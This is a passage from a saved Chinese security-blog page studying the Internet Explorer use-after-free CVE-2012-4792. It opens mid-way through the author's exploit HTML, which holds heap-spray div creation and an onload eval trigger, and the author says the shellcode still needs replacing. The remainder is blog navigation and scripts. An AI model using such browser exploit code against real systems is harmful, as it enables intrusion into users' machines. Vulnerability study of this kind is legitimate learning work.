class="line">          {</div><div class="line">               arr_div[i]= document.createElement(<span class="string">"div"</span>);</div><div class="line">               arr_div[i].title= junk.substring(<span class="number">0</span>,(<span class="number">0x58</span>-<span class="number">6</span>)/<span class="number">2</span>);</div><div class="line">          }</div><div class="line">     }</div><div class="line"></div><div class="line">     &lt;<span class="regexp">/script&gt;</span></div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body onload=<span class="string">"eval(helloWorld())"</span>&gt;</div><div class="line">     &lt;form id=<span class="string">"a"</span>&gt;</div><div class="line">     &lt;<span class="regexp">/form&gt;</span></div><div class="line">     &lt;dfn id="b"&gt;</div><div class="line">     &lt;/dfn&gt;</div><div class="line">&lt;<span class="regexp">/body&gt;</span></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/exploit_it.png"/><br/>剩下的工作就是 替换下 <code>sc</code>了，这份并没有成功执行，虽然后面有<code>call xxxx</code></p>
<hr/>
<p>大二的时候在校园讲座的时候使用了这个例子，当时的演示截图:</p>
<p><img alt="" src="./CVE-2012-4792学习  o0xmuhe's blog/exec_code.png"/></p>
<h4 id="引用"><a class="headerlink" href="#引用" title="引用"></a>引用</h4><ul>
<li><a href="http://www.netfairy.net/?post=201" rel="external" target="_blank">Netfairy师傅的帮助</a></li>
</ul>
</div>
</div>
<div class="copyright">
<p><span>本文标题:</span><a href="/2016/10/11/CVE-2012-4792学习/">CVE-2012-4792学习</a></p>
<p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
<p><span>发布时间:</span>2016年10月11日 - 16时04分</p>
<p><span>最后更新:</span>2016年11月07日 - 17时04分</p>
<p>
<span>原始链接:</span><a class="post-url" href="/2016/10/11/CVE-2012-4792学习/" title="CVE-2012-4792学习">http://o0xmuhe.me/2016/10/11/CVE-2012-4792学习/</a>
<span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2016/10/11/CVE-2012-4792学习/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
<script src="./CVE-2012-4792学习  o0xmuhe's blog/clipboard.min.js"></script>
<script> var clipboard = new Clipboard('.copy-path'); </script>
</p>
<p>
<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
</div>
<nav id="article-nav">
<a class="article-nav-link-wrap" href="/2016/10/11/HITCON-2016-Quals-SecretHolder/" id="article-nav-newer">
<strong class="article-nav-caption">&lt;</strong>
<div class="article-nav-title">
        
          HITCON-2016-Quals-SecretHolder
        
      </div>
</a>
<a class="article-nav-link-wrap" href="/2016/10/06/一点感悟/" id="article-nav-older">
<div class="article-nav-title">一点感悟</div>
<strong class="article-nav-caption">&gt;</strong>
</a>
</nav>
</article>
<div class="toc-article" id="toc">
<strong class="toc-title">文章目录</strong>
<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#测试环境"><span class="toc-number">2.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-及-漏洞验证"><span class="toc-number">3.</span> <span class="toc-text">POC 及 漏洞验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞调试"><span class="toc-number">4.</span> <span class="toc-text">漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-什么时候创建了这个对象"><span class="toc-number">4.1.</span> <span class="toc-text">1.什么时候创建了这个对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-什么时候释放了这个对象"><span class="toc-number">4.2.</span> <span class="toc-text">2.什么时候释放了这个对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-什么时候重用了这个对象"><span class="toc-number">4.3.</span> <span class="toc-text">3.什么时候重用了这个对象</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">5.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编写exp"><span class="toc-number">6.</span> <span class="toc-text">编写exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#引用"><span class="toc-number">7.</span> <span class="toc-text">引用</span></a></li></ol>
</div>
<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
<script src="./CVE-2012-4792学习  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>
<div class="bdsharebuttonbox">
<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
<div class="duoshuo" id="comments">
<!-- 多说评论框 start -->
<div class="ds-thread" data-thread-key="2016/10/11/CVE-2012-4792学习/" data-title="CVE-2012-4792学习" data-url="http://o0xmuhe.me/2016/10/11/CVE-2012-4792学习/"></div>
<!-- 多说评论框 end -->
<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
<script type="text/javascript">
    var duoshuoQuery = {short_name:"o0xmuhe"};
    (function() {
        var ds = document.createElement('script');
        ds.type = 'text/javascript';ds.async = true;
        ds.src = '/js/embed.js';
        ds.charset = 'UTF-8';
        (document.getElementsByTagName('head')[0] 
         || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
    </script>
<!-- 多说公共JS代码 end -->
</div>
<div class="scroll" id="post-nav-button">
<a href="/2016/10/11/HITCON-2016-Quals-SecretHolder/" title="上一篇: HITCON-2016-Quals-SecretHolder">
<i class="fa fa-angle-left"></i>
</a>
<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
<a href="/2016/10/06/一点感悟/" title="下一篇: 一点感悟">
<i class="fa fa-angle-right"></i>
</a>
</div>
<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/08/SSCTF-2017部分Writeup/">SSCTF-2017部分Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/360春秋CTF-pwn/">360春秋CTF--pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/Linux-Kernel-Exploit-4-beginners/">Linux Kernel Exploit 4 beginners</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/NJCTF-2017部分wp/">NJCTF-2017部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/06/SECCON-2016-jmper/">SECCON-2016 jmper</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/04/codegate2017-angrybird/">codegate2017-angrybird</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/LLVM-Study-Log/">LLVM Study Log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/ichunqiu-CTF-2017-2/">ichunqiu-CTF-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/Adding-your-own-syscall-in-linux-kernel/">Adding your own syscall in linux kernel</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/Windows-Kernel-Exploit-Study-3/">Windows-Kernel-Exploit-Study(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/30/Linux socket进程间通信及应用/">Linux socket进程间通信及应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/28/一点碎碎念/">一点碎碎念</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/22/Have-fun-with-Blind-ROP/">Have fun with Blind ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/20/Windows-Kernel-Exploit-Study-2/">Windows Kernel Exploit Study(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/what-DynELF-does-basically/">what DynELF does basically</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/17/fuzzing-with-peach-Just-a-toy/">fuzzing with peach(Just a toy)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/25/PlaidCTF-2016-butterfly/">PlaidCTF 2016 butterfly</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/Have-fun-with-glibc内存管理/">Have fun with glibc内存管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/linux-下起shell失败的分析/">linux 下起shell失败的分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/07/Baiudu杯-pwn专场记录/">Baiudu杯 pwn专场记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/29/how-to-compile-WinAFL/">how to compile WinAFL</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/yocto-writeup/">yocto writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/HITCON-2016-Quals-SecretHolder/">HITCON-2016-Quals-SecretHolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/CVE-2012-4792学习/">CVE-2012-4792学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/06/一点感悟/">一点感悟</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/BCTF-cloud/">BCTF--cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/一些环境配置遇到的坑-持续更新/">一些环境配置遇到的坑(持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/16/Malloc-Maleficarum-复盘/">Malloc-Maleficarum-复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/26/初试winafl/">初试winafl</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/14/pwnable-kr-alloca/">pwnable.kr -- alloca</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/简单的尝试angr/">简单的尝试angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/第一个android-cm调试分析/">第一个android cm调试分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/install-gef/">install gef</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/30/cctf-pwn350/">cctf pwn350</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/15/heap-vuln-unlink/">heap vuln -- unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/02/format-string-with-stack-frame/">format string with stack frame</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/16/RCTF-PWN200/">RCTF -- PWN200</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/05/dragon/">dragon</a></li></ul>
<script src="./CVE-2012-4792学习  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>
<script>
</script>
</div>
<footer id="footer">
<div class="outer">
<div id="footer-info">
<div class="footer-left">
                © 2017 muhe
            </div>
<div class="footer-right">
<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
</div>
<div class="visit">
<span id="busuanzi_container_site_pv" style="display:none">
<span id="site-visit">访客数量: 
                            <span id="busuanzi_value_site_uv"></span>
</span>
</span>
<span>, </span>
<span id="busuanzi_container_page_pv" style="display:none">
<span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
</span>
</span>
</div>
</div>
</footer>
</div>
<script src="./CVE-2012-4792学习  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="./CVE-2012-4792学习  o0xmuhe's blog/main.js"></script>
<script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>
<div class="scroll" id="scroll">
<a href="#"><i class="fa fa-arrow-up"></i></a>
<a href="#comments"><i class="fa fa-comments-o"></i></a>
<a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>
<script async="" src="./CVE-2012-4792学习  o0xmuhe's blog/busuanzi.pure.mini.js">
</script>
<script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>
</div>
</body>
</html>